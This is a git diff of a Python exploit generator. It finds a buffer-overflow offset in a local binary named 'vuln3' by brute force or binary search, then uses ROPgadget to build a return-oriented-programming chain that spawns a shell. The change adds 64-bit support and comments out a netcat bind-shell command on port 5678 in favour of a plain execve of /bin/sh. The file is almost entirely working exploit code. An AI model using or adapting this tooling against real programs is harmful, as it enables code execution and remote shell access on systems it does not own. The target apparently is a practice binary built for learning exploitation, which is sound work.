@@ -1,12 +1,15 @@
 import os
 import ROPcompile
 
+BINARY_BITS = 64
+
 BRUTE_FORCE = 0
 BINARY_SEARCH = 1
 ANALYSIS = 2
 
-COMMAND = "execve(\"/tmp//nc\",\"-lnp\",\"5678\",\"-tte\",\"\bin//sh\", NULL)"
-PROGRAM = "vuln3"
+#COMMAND = "execve(\"/tmp//nc\",\"-lnp\",\"5678\",\"-tte\",\"/bin//sh\", NULL)"
+COMMAND = "execve(\"/bin//sh\")"
+PROGRAM = "vuln3-non-static"
 FILE_MODE = True
 
 def main():
@@ -47,8 +50,8 @@ def bruteForce(program):
         writePayload(test, payload)
         output = run(program, fileLoc)
         print("Running program with buffer of " + str(i) + ", returned code " + str(output))
-        if output == 35584:
-            return i - 1 + 4
+        if output != 0:
+            return i - 1 + (BINARY_BITS/8)
     return -1
 
 def binarySearch(program):
@@ -82,7 +85,7 @@ def binarySearch(program):
         if High == Low + 1:
             found = True
 
-    return High + 4
+    return High + int(BINARY_BITS/8)
 
 
 def writePayload(file, string):
@@ -99,14 +102,14 @@ def createROPchain(command, bufflength):
     os.system("ROPgadget --binary " + PROGRAM + " > rop.txt")
 
     #Write command as gadgets
-    payload = ROPcompile.CreateROPChain(command, bufflength, "rop.txt")
+    payload = ROPcompile.CreateROPChain(command, bufflength, "rop.txt", BINARY_BITS)
 
     #Verify gadgets are present
 
     #Rewrite for missing gadgets
 
     #Write the payload
-    pfile = open("payload", "w")
+    pfile = open("payload", "bw")
     pfile.write(payload)
 
 
